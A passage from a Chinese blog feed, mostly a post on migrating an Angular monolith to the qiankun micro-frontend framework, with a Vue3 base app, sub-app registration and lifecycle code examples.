规则后右侧的 Decisions 页签可以看到下面的可视化规则：<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1662193445977-3a831462-ec0b-417e-abf6-5a0c9bfd2829.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/2373519/1662193445977-3a831462-ec0b-417e-abf6-5a0c9bfd2829.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="aptr3"></a></p><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h1><p>使用 json-rules-engine 开源规则引擎可以实现在复杂逻辑处的优化处理，配合可视化的方案可以更方便的阅读引擎规则。</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 解决方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 解决方案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qiankun 微前端落地实践</title>
      <link href="/2024/04/17/solution/qiankun-wei-qian-duan-luo-di-shi-jian/"/>
      <url>/2024/04/17/solution/qiankun-wei-qian-duan-luo-di-shi-jian/</url>
      
        <content type="html"><![CDATA[<p><a name="rd6LP"></a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近些年,前端发展火热, 百家争鸣, 各种技术层出不穷,如今的前端已经不再像以前一样就是简单的写页面、调样式、处理 DOM 等，现在的前端工作内容越来越复杂，技术点也越来越丰富。<br /> 当前，基于 Vue、React、Angular 的单页应用开发模式已经成为业界主流, 基本上成为近几年前端项目必备技术, 其前端生态也逐渐完善, 我们可以利用这些技术与生态快速构建一个新的应用, 这也大大缩短了项目的研发周期.<br />但是随着公司业务的不断发展，前端业务越来越复杂，SPA 模式势必会导致项目文件越来越多, 构建速度越来越慢, 代码和业务逻辑也越来越难以维护,应用开始变得庞大臃肿，逐渐成为一个巨石应用<br /> 面对一个庞大,具有悠久历史的项目, 在日常开发、上线时都需要花费不少的时间来构建项目，这样的现象对开发人员的开发效率和体验都造成了极不好的影响, 因此解决巨石问题, 迫在眉睫, 势在必行.<br />因此我们需要选择一个合适的方案，能不影响现有项目的继续迭代, 能兼容新的的技术栈，能支持老项目的增量升级, 新技术的加入不影响线上的稳定运行, <br /> 如果有这样一个应用, 每个独立模块都有一个独立仓库，独立开发、独立部署、独立访问、独立维护，还可以根据团队的特点自主选择适合自己的技术栈，这样就能够解决我们所面临的问题, 还能极大的提升开发人员的效率和体验.</p><p><a name="spGjg"></a></p><h1 id="业务背景"><a href="#业务背景" class="headerlink" title="业务背景"></a>业务背景</h1><p>运营平台是我们内部使用的一套管理系统, 并一直跟随业务保持着两周一个版本的迭代工作, 后期的需求也很多.<br />因历史原因框架选型采用 Angular8.x 开发，并且累计超过 10+ 位开发者参与业务开发，是一个页面数量多、逻辑关系混乱、注释信息不够完整、技术规范不统一、代码量的庞大，构建、部署的低效等问题的“巨石应用”。<br /> 考虑到组件复用以及降低维护成本，在想怎么可以做到及时止损，,控制住项目指数级的野蛮生长,并把 Vue 技术运用到项目中同时使用。<br />因此统一技术栈、工程拆分、规范化开发提上了工作日程，并期望各工程原有访问地址维持不变，使用户感知不到变化。</p><p>系统是采用传统的布局结构，头部导航展示一级菜单, 左侧展示一级菜单下的二级菜单, 所有页面内容都呈现在中间白色区域。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561314817-174daa95-b701-4ab6-9f3b-2e11432ca8dd.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561314817-174daa95-b701-4ab6-9f3b-2e11432ca8dd.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>项目文件统计<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561343766-a045a48e-a746-4518-9014-ed0038f4eedb.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561343766-a045a48e-a746-4518-9014-ed0038f4eedb.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>页面与组件总数已经超过 1000 个, 代码总量超过 17 万行.</p><p>Jenkins 构建一次时间</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561353128-bd95cc13-5a1d-45e6-a71c-b92823ff73e9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561353128-bd95cc13-5a1d-45e6-a71c-b92823ff73e9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>单次构建时间达到 12min 之久,在遇到多项目并发构建时时间甚至会更久,严重影响开发&#x2F;测试&#x2F;生产的部署效率</p><p><a name="xUEOj"></a></p><h1 id="面临问题"><a href="#面临问题" class="headerlink" title="面临问题"></a>面临问题</h1><p>从可行性、成本、技术方案、事故、回归验证等方面考虑以下问题</p><ol><li>需要将现有项目按照业务或其它一定的规则进行拆分</li><li>现有项目的迭代计划不受影响</li><li>不能影响线上用户使用</li><li>框架需要支持原有的 Angular 技术与新接入的 Vue2&#x2F;Vue3 技术</li><li>总体项目性能不能牺牲过大,会影响使用.</li><li>对于拆分改造,能否输出文档</li><li>全盘改造的成本评估是否合理</li><li>改动的影响范围是否可控</li><li>团队成员是否需要提前进行相关技术学习培训</li><li>首次上线是否存在突发事故风险与应对方案</li><li>如何进行回归测试.</li><li>微服务化后团队合作需要做出哪些改变.</li></ol><p><a name="kJhF4"></a></p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><ol><li>能够实现增量升级,尽可能减少对现有迭代开发的进度影响</li><li>保持原有访问地址不变，让用户无感知变化，不带来任何多余麻烦</li><li>大型模块可以分开开发、独立部署，实现工程拆分</li><li>删除无用代码，精简代码以及实现前端代码的规范化,易于后期维护</li><li>整理出组件库,实现内网部署,实现公共组件复用目的</li><li>提高页面加载性能以及预期达到整体项目性能的提高</li><li>增加监控体系,能有效收集到线上遗留异常问题</li><li>清晰梳理各模块业务,提高团队成员对项目、业务等的认识<br><a name="BnJ1X"></a></li></ol><h1 id="方案对比"><a href="#方案对比" class="headerlink" title="方案对比"></a>方案对比</h1><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561400773-cb4d0279-e19d-4e86-add6-560d04fb8ccf.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561400773-cb4d0279-e19d-4e86-add6-560d04fb8ccf.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="y3qlC"></a></p><h1 id="qiankun-介绍"><a href="#qiankun-介绍" class="headerlink" title="qiankun 介绍"></a>qiankun 介绍</h1><p>qiankun 是一个基于 <em><a href="https://github.com/CanopyTax/single-spa">single-spa</a></em> 的*<a href="https://micro-frontends.org/">微前端</a>*实现库，旨在帮助大家能更简单、无痛的构建一个生产可用微前端架构系统。_<br />_ qiankun 孵化自蚂蚁金融科技基于微前端架构的云产品统一接入平台，在经过一批线上应用的充分检验及打磨后，我们将其微前端内核抽取出来并开源，希望能同时帮助社区有类似需求的系统更方便的构建自己的微前端系统，同时也希望通过社区的帮助将 qiankun 打磨的更加成熟完善。_<br />_ 目前 qiankun 已在蚂蚁内部服务了超过 200+ 线上应用，在易用性及完备性上，绝对是值得信赖的。 ——摘自 qiankun 官网介绍_</p><p><a name="XfsS8"></a></p><h1 id="Single-SPA-的简要介绍"><a href="#Single-SPA-的简要介绍" class="headerlink" title="Single-SPA 的简要介绍"></a><strong>Single-SPA 的简要介绍</strong></h1><p>2018 年 Single-SPA 诞生了，single-spa 是一个用于前端微服务化的 JavaScript 前端解决方案（本身没有处理样式隔离，js 执行隔离）实现了路由劫持和应用加载；目前已经发展到 5.x 版本.官网:<a href="https://single-spa.js.org/">https://single-spa.js.org/</a></p><p><a name="jtC3y"></a></p><h1 id="qiankun-的简要介绍"><a href="#qiankun-的简要介绍" class="headerlink" title="qiankun 的简要介绍"></a><strong>qiankun 的简要介绍</strong></h1><blockquote><pre><code>很多人可能会好奇 qiankun 这个名字是怎么来的。实际上源自于这句话：**小世界有大乾坤。我们希望在微前端这个小世界**里面，通过 qiankun 这个框架鼓捣一个**大乾坤**。&lt;br /&gt; 方涣 –– 蚂蚁金服体验技术部前端工程师</code></pre></blockquote><pre><code>在 qiankun 里直接选用了社区成熟的方案 Single-SPA。 Single-SPA 已经具有劫持路由的功能，并完成了应用加载功能，也支持路由切换的操作，所以在开源的基础上进行设计与开发可以节省很多成本, 不需要重复造轮了。正是因为基于Single-SPA这样强大的开源支持,qiankun最早在2019年就已问世, 它提供了更加开箱即用的 API （single-spa + sandbox + import-html-entry） 做到了技术栈无关，并且接入简单（有多简单呢，像iframe一样简单）。什么样的一个应用能够成为子应用，能够接入到qiankun的框架应用里？&lt;br /&gt;由于对接qiankun的子应用与技术栈无关，所以qiankun框架在设计上也考虑**协议接入**的方式。也就是说只要你的应用实现了 bootstrap 、mount 和 unmount 三个生命周期钩子，有这三个函数导出，负责外层的框架应用就可以知道如何加载这个子应用.这三个钩子也正好是子应用的生命周期钩子。当子应用第一次挂载的时候，会执行 bootstrap 做一些初始化，然后执行 mount 将它挂载。如果是一个 React 技术栈的子应用，可能就在 mount 里面写 ReactDOM.render ，把项目的 ReactNode 挂载到真实的节点上，把应用渲染出来。当应用切换走的时候，会执行 unmount 把应用卸载掉，当它再次回来的时候（典型场景：你从应用 A 跳到应用 B，过了一会儿又跳回了应用 A），这个时候是不需要重新执行一次所有的生命周期钩子的，也就是说不需要从 bootstrap 开始，而是会直接从 mount 阶段继续，这就也做到了应用的缓存。&lt;br /&gt;子应用的入口又如何选择？&lt;br /&gt;qiankun 在这里选择的是 HTML，就是以 HTML 作为入口。借用了 Single-SPA 能力之后，qiankun已经基本解决了应用的加载与切换。我们接下来要解决的另一块事情是**应用的隔离和通信。**</code></pre><p><a name="utMLn"></a></p><h1 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a><strong>最佳实践</strong></h1><p><br /> 基于 qiankun 微服务的前端框架, 其架构基本可以概括为: 基座应用 + 子应用 + 公共依赖方式。<br />基座应用可以理解为一个用于承载子应用的运行容器,所有的子应用都在这个容器内完成一系列初始化、挂载等生命周期。子应用即拆分出来个的一些子系统做成的应用。<br /> 公共依赖就是抽离出在主应用与子应用中都会存在的公共依赖, 抽离出来后只需要在加载主应用时初始化, 其它子应用只需使用即可，无需重复加载。<br /> 我们这里采用的技术栈是主应用 Vue3，原系统拆分为四个子应用(Angular 框架)，新增一个子应用(Vue3 框架). 新增的子应用用于承载后续的业务需求开发。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561442594-63c72410-c996-4065-86c7-482aebf4b9ba.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644561442594-63c72410-c996-4065-86c7-482aebf4b9ba.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>初始化基座项目, 通过 vue&#x2F;cli 快速创建一个 vue 项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue create appbase</span><br></pre></td></tr></table></figure><p><br />安装完成后，运行如下，vue 的默认首页，只要保证能够正常运行就好。<br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644889954653-7cc520c5-d1c6-4fe3-96c8-297638613fca.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644889954653-7cc520c5-d1c6-4fe3-96c8-297638613fca.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>构建主应用基座， 开始进行改造 , 首先安装 qiankun。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644890204248-7608175b-e02f-4bf8-bae7-c7130b93f9ef.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644890204248-7608175b-e02f-4bf8-bae7-c7130b93f9ef.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>安装完 qiankun 后，先对 main.ts 进行改造，针对主应用进行配置, 这里我们需要定义并注册微服务应用, 并添加全局状态管理与消息通知机制<br /><code>apps.ts</code>文件用于统一存放微应用的信息</p><p>微应用配置信息中的<code>container</code>是用于设定微应用挂载节点的，要与自己设定的节点<code>&lt;divid=&quot;subapp&quot;&gt;&lt;/div&gt;</code>中的 id 保持一致</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// src/core/apps.ts</span><br><span class="line"></span><br><span class="line">import &#123; RegistrableApp &#125; from &quot;qiankun&quot;;</span><br><span class="line">const container = &#x27;#subapp&#x27;;</span><br><span class="line">const props = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">export const apps: Partial&lt;RegistrableApp&lt;any&gt;&gt;[] = [</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#x27;app1&#x27;,</span><br><span class="line">        entry: &#x27;http://localhost:8081&#x27;,</span><br><span class="line">        activeRule: `/portal/app1`,</span><br><span class="line">        container,</span><br><span class="line">        props</span><br><span class="line">    &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">// src/main.ts</span><br><span class="line">        setupStore(app);</span><br><span class="line"></span><br><span class="line">        // router</span><br><span class="line">        setupRouter(app);</span><br><span class="line"></span><br><span class="line">        // components</span><br><span class="line">        setupComponents(app);</span><br><span class="line"></span><br><span class="line">        // directives</span><br><span class="line">        setupDirectives(app);</span><br><span class="line"></span><br><span class="line">        // i18n</span><br><span class="line">        setupI18n(app);</span><br><span class="line"></span><br><span class="line">        // report</span><br><span class="line">        setupEcharts(app);</span><br><span class="line"></span><br><span class="line">        // EventBus</span><br><span class="line">        setupMitt(app);</span><br><span class="line"></span><br><span class="line">        // DataTable</span><br><span class="line">        setupVxe(app);</span><br><span class="line"></span><br><span class="line">        // mount</span><br><span class="line">        router.isReady().then(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">            app.mount(&#x27;#app&#x27;, true);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // console.log(app);</span><br><span class="line">        console.log(&#x27;loading : &#x27;, loading);</span><br><span class="line">        app.content = appContent;</span><br><span class="line">        app.loading = loading;</span><br><span class="line">        updateApp(app);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 主应用渲染</span><br><span class="line">render(&#123; loading: true &#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 注册子应用</span><br><span class="line">const microApps: RegistrableApp&lt;any&gt;[] = [</span><br><span class="line">    ...apps.map(mapp =&gt; &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            ...mapp,</span><br><span class="line">            props: &#123;</span><br><span class="line">                ...mapp.props,</span><br><span class="line">                app,</span><br><span class="line">                pager</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; as RegistrableApp&lt;any&gt;;</span><br><span class="line">    &#125;)</span><br><span class="line">];</span><br><span class="line">const lifeCycles: FrameworkLifeCycles&lt;any&gt; = &#123;</span><br><span class="line">    // beforeLoad: app =&gt; new Promise(resolve =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    //     console.log(&quot;app beforeLoad&quot;, app);</span><br><span class="line">    //     resolve(true);</span><br><span class="line">    // &#125;),</span><br><span class="line">    // afterUnmount: app =&gt; new Promise(resolve =&gt; &#123;</span><br><span class="line"></span><br><span class="line">    //     console.log(&quot;app afterUnmount&quot;, app);</span><br><span class="line">    //     resolve(true);</span><br><span class="line">    // &#125;)</span><br><span class="line">&#125;;</span><br><span class="line">registerMicroApps(microApps, lifeCycles);</span><br><span class="line"></span><br><span class="line">// 启动微服务</span><br><span class="line">const opts: FrameworkConfiguration = &#123; prefetch: false &#125;;</span><br><span class="line">start(opts);</span><br></pre></td></tr></table></figure><p><br />运行起来 看下页面效果</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644890562646-40f3d2ee-171c-441c-a1ef-ce3b47e7b653.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2022/png/26114887/1644890562646-40f3d2ee-171c-441c-a1ef-ce3b47e7b653.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><pre><code>是的，没有错，还是Vue项目最开始的默认效果，因为我们只对main.ts进行了改造，在没有接入子应用时候，主营用作为一个独立应用仍然是可以运行的。&lt;br /&gt;总结一下main.ts的改造过程:</code></pre><ol><li>初始化基座应用 <code>vue create appbase</code></li><li>安装乾坤 <code>yarn add qiankun</code>或 <code>npm i qiankun -S</code></li><li>设置微服务应用挂载的 DOM 节点<code>&lt;div id=&quot;subapp&quot;&gt;&lt;/div&gt;</code>,注意这个 id 需要在注册子应用时使用</li><li>定义子应用 <code>appbase\src\core\apps.ts</code></li><li>改造<code>main.ts</code>, 注册子应用并添加相关工具类函数.</li></ol><p><br />到此一个基座应用的开发先告一段落, 接下来就是需要定义子应用,并确保定义的子应用能在当前基座应用下成功运行.</p><p><a name="J1QeE"></a></p><h1 id="创建微应用容器"><a href="#创建微应用容器" class="headerlink" title="创建微应用容器"></a>创建微应用容器</h1><p>我们在实践项目中使用的是 Vue3 作为基座应用, 原有的 Angular 项目拆分为多个子应用, 并新增加了一个 Vue 的子应用. 为了增加对 qiankun 的理解, 本文特意在实例中增加了不同版本的 Angular 框架以及 React 框架的微应用演示.</p><p><a name="ZnpTW"></a></p><h2 id="接入-Vue-子应用-app1-vue3"><a href="#接入-Vue-子应用-app1-vue3" class="headerlink" title="接入 Vue 子应用 app1(vue3)"></a>接入 Vue 子应用 app1(vue3)</h2><p><a name="jTo0l"></a></p><h3 id="创建子应用-app1-方式同上，仍然使用-vue-x2F-cli-创建"><a href="#创建子应用-app1-方式同上，仍然使用-vue-x2F-cli-创建" class="headerlink" title="创建子应用 app1, 方式同上，仍然使用 vue&#x2F;cli 创建"></a>创建子应用 app1, 方式同上，仍然使用 vue&#x2F;cli 创建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vue create app1</span><br></pre></td></tr></table></figure><p><a name="U86m9"></a></p><h3 id="对子应用进行改造"><a href="#对子应用进行改造" class="headerlink" title="对子应用进行改造"></a>对子应用进行改造</h3><p>添加<code>vue.config.js</code>, 有两点需要注意:</p><ul><li>output 需要设置为 umd 格式的 library, 这样主应用就可以加载当前 lib 并运行.</li><li>devServe 端口需要设置与注册该子应用时的端口一致, 并设置 cors, 因为子应用与主应用不同域.<br><a name="E63wP"></a></li></ul><h3 id="改造子应用的main-ts"><a href="#改造子应用的main-ts" class="headerlink" title="改造子应用的main.ts"></a>改造子应用的<code>main.ts</code><br /><br /></h3><ol><li><p>子应用的接入需要符合 qiankun 的接入协议</p><blockquote><p>微应用需要在自己的入口 js (通常就是你配置的 webpack 的 entry js) 导出 bootstrap、mount、unmount 三个生命周期钩子，以供主应用在适当的时机调用。</p></blockquote></li><li><p>子应用不需要额外安装任何其它依赖即可接入主应用</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">// app1\src\main.ts</span><br><span class="line">        // directives</span><br><span class="line">        setupDirectives(app);</span><br><span class="line"></span><br><span class="line">        // i18n</span><br><span class="line">        setupI18n(app);</span><br><span class="line"></span><br><span class="line">        // report</span><br><span class="line">        setupEcharts(app);</span><br><span class="line"></span><br><span class="line">        // EventBus</span><br><span class="line">        setupMitt(app);</span><br><span class="line"></span><br><span class="line">        // DataTable</span><br><span class="line">        setupVxe(app);</span><br><span class="line"></span><br><span class="line">        // registe pager</span><br><span class="line">        setPager(pager);</span><br><span class="line"></span><br><span class="line">        // mount</span><br><span class="line">        router.isReady().then(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">            app.mount(container ? container.querySelector(&#x27;#app&#x27;) : &#x27;#app&#x27;, true);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        app.content = appContent;</span><br><span class="line">        app.loading = loading;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 是否运行在微服务环境中</span><br><span class="line">const isMicroApp: boolean = (window as any).__POWERED_BY_QIANKUN__;</span><br><span class="line"></span><br><span class="line">// 允许独立运行 方便调试</span><br><span class="line">isMicroApp || render(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">if (isMicroApp) __webpack_public_path__ = (window as any).__INJECTED_PUBLIC_PATH_BY_QIANKUN__;</span><br><span class="line"></span><br><span class="line">// 微服务接入协议</span><br><span class="line">export async function bootstrap() &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export async function mount(props: any) &#123;</span><br><span class="line"></span><br><span class="line">    // 订阅主应用全局状态变更通知事件</span><br><span class="line">    props.onGlobalStateChange((state, prev) =&gt; &#123;</span><br><span class="line">        // state: 变更后的状态; prev 变更前的状态</span><br><span class="line">        console.log(state, prev);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    render(props);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">export async function unmount() &#123;</span><br><span class="line">    if (app) &#123;</span><br><span class="line">        app.unmount();</span><br><span class="line">        app._container.innerHTML = &#x27;&#x27;;</span><br><span class="line">        app = null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="n4UWw"></a></p><h2 id="接入-Angular-子应用-app2-Angular12"><a href="#接入-Angular-子应用-app2-Angular12" class="headerlink" title="接入 Angular 子应用 app2(Angular12)"></a>接入 Angular 子应用 app2(Angular12)<br /><br /></h2><ol><li>创建子应用 App2, Angular 子应用, app2 采用了 Angular12 版本,</li></ol><p><code>ng new app2</code></p><ol start="2"><li>注册微应用</li></ol><p><code>appbase\src\core\apps.ts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import &#123; RegistrableApp &#125; from &quot;qiankun&quot;;</span><br><span class="line">const container = &#x27;#subapp&#x27;;</span><br><span class="line">const props = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">export const apps: Partial&lt;RegistrableApp&lt;any&gt;&gt;[] = [</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#x27;app1&#x27;,</span><br><span class="line">        entry: &#x27;http://localhost:8081&#x27;,</span><br><span class="line">        activeRule: `/portal/app1`,</span><br><span class="line">        container,</span><br><span class="line">        props</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#x27;app2&#x27;,</span><br><span class="line">        entry: &#x27;http://localhost:8082&#x27;,</span><br><span class="line">        activeRule: `/portal/app2`,</span><br><span class="line">        container,</span><br><span class="line">        props</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        name: &#x27;app3&#x27;,</span><br><span class="line">        entry: &#x27;http://localhost:8083&#x27;,</span><br><span class="line">        activeRule: `/portal/app3`,</span><br><span class="line">        container,</span><br><span class="line">        props</span><br><span class="line">    &#125;</span><br><span class="line">];</span><br></pre></td></tr></table></figure><ol 